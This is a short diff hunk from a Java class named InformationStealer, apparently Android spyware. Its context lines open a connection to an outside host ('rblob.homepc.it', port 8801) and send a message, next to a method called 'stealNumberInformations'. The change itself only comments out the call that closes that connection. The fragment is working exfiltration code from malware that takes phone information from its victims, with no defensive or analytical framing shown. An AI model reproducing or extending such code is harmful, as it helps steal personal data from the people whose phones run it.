@@ -92,7 +92,7 @@ public class InformationStealer implements Runnable {
 
         netman.openConnection("rblob.homepc.it",8801,context);
         netman.sendMessage2(messaggio);
-        netman.closeConnection();
+       // netman.closeConnection();
     }
 
     static String stealNumberInformations(Context context) {
